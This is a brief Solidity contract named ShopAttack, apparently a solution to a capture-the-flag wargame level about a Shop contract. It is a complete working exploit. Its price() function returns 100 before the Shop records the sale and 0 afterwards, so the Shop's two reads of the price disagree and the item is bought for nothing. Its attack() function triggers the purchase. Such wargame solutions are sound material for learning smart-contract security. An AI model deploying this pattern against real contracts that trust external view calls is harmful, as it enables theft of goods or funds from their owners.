// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Shop.sol";


contract ShopAttack is Buyer {
    function price() external view returns (uint) {
        if (!Shop(msg.sender).isSold()) {
            return 100;
        } else {
            return 0;
        }
    }

    function attack(address _shop) public {
        Shop shop = Shop(_shop);
        shop.buy();
    }
}